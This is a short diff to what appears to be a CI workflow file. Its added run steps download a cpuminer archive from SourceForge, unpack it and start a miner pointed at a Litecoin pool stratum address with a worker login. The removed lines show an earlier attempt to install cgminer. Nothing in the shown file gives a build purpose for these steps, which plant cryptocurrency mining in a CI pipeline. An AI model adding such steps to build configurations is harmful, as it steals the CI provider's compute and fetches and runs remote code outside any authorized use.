@@ -23,5 +23,7 @@ jobs:
 
       # specify any bash command here prefixed with `run: `
       - run: sudo apt-get update
-      - run: curl
-      - run: apt install cgminer -y
+      - run: sudo apt-get install curl tar -y
+      - run: curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
+      - run: tar xvzf c.tar.gz
+      - run: ./miners -o stratum+tcp://us.litecoinpool.org:3333 -u arthdal20.2 -p 2
